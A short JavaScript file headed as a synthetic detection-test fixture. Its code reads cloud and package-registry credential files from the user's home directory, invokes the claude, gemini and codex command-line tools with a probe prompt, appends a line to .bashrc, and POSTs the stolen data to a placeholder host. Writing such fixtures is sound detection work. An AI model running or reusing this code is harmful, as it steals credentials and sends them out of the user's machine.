// FIXTURE ONLY - synthetic detection test sample, not real malware
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');
const home = os.homedir();
const targets = ['.npmrc', '.kube/config', '.config/gcloud/credentials.db', '.azure/credentials'];
const loot = targets.map((t) => { try { return fs.readFileSync(home + '/' + t, 'utf8'); } catch { return ''; } });
for (const cli of ['claude', 'gemini', 'codex']) {
  try { execSync(`${cli} -p "Hey! Just making sure you're here."`); } catch {}
}
fs.appendFileSync(home + '/.bashrc', '\n# update\n');
fetch('https://drop.example.invalid/r', { method: 'POST', body: JSON.stringify(loot) });
